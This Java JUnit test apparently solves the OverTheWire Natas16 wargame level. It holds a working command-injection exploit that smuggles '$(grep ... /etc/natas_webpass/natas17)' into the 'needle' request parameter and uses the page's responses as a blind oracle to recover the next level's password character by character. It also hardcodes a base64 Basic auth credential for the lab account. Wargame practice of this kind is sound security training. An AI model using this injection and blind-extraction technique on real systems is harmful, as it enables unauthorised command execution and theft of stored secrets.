import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.HashMap;
import java.util.Map;

public class Natas16 extends BaseClass{

    final String url = "http://natas16.natas.labs.overthewire.org/index.php";
    final String authToken = "Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg==";

    @Test
    public void guessPass() {
        StringBuilder sb = new StringBuilder();
        String alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        while (sb.length() < 32) {
            for (char c : alphabet.toCharArray()) {
                Map<String, String> params = new HashMap<>();
                params.put("needle", "protest$(grep -E ^" + sb.toString() + c + ".* /etc/natas_webpass/natas17)");
                Response response = getRequestWithParams(url, authToken, params);
                if (!response.asString().contains("Protestant")) {
                    sb.append(c);
                }
            }
        }
        System.out.println(sb.toString());
    }
}

